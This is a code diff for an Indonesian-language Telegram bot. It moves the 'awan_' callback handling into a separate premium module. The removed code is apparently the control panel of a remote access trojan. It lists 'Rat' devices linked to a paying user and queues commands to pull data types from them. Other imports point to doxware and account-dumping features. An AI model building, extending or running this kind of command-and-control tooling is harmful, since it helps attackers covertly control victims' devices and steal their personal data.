@@ -18,6 +18,7 @@ const TrackedLink = require('./models/trackedLink');
 const QRCode = require('qrcode');
 const Jimp = require('jimp');
 const { createInlineKeyboard, isAdmin, sendStartMessage, showProductDetail, sendAwanStartMessage } = require('./utils');
+const awanPremiumHandler = require('./commands/awan_premium');
 const DoxwareSimulation = require('./models/doxwareSimulation');
 const natural = require('natural');
 const { sendAkun } = require('./unchek');
@@ -835,37 +836,8 @@ bot.on("callback_query", async (query) => {
             await bot.answerCallbackQuery(query.id, { text: 'Terjadi kesalahan.', show_alert: true });
         }
     }
-    else if (data.startsWith("awan_")) {
-        const user = await User.findOne({ chatId: userId });
-        if (!user || !user.isPremium) {
-            return bot.answerCallbackQuery(query.id, { text: 'Fitur ini hanya untuk pengguna premium.', show_alert: true });
-        }
-
-        const action = data.split("_")[1];
-
-        if (action === "list") {
-            const devices = await Rat.find({ chatId: userId });
-            if (devices.length === 0) {
-                return bot.sendMessage(chatId, "Tidak ada perangkat yang terhubung.");
-            }
-            let message = "Perangkat yang terhubung:\n\n";
-            devices.forEach(device => {
-                message += `- ${device.deviceId}\n`;
-            });
-            bot.sendMessage(chatId, message);
-        } else if (action === "get") {
-            const dataType = data.split("_")[2];
-            const devices = await Rat.find({ chatId: userId });
-            if (devices.length === 0) {
-                return bot.sendMessage(chatId, "Tidak ada perangkat yang terhubung.");
-            }
-            // For now, just send the command to the first device
-            const deviceId = devices[0].deviceId;
-            const rat = await Rat.findOne({ deviceId });
-            rat.pendingCommand = `get_${dataType}`;
-            await rat.save();
-            bot.sendMessage(chatId, `Meminta data '${dataType}' dari perangkat ${deviceId}...`);
-        }
+    else if (data.startsWith("awan_") || data === 'awan_premium_menu') {
+        awanPremiumHandler.execute(bot, query);
     }
     else if (data === "unchek_menu") {
         const user = await User.findOne({ chatId: userId });
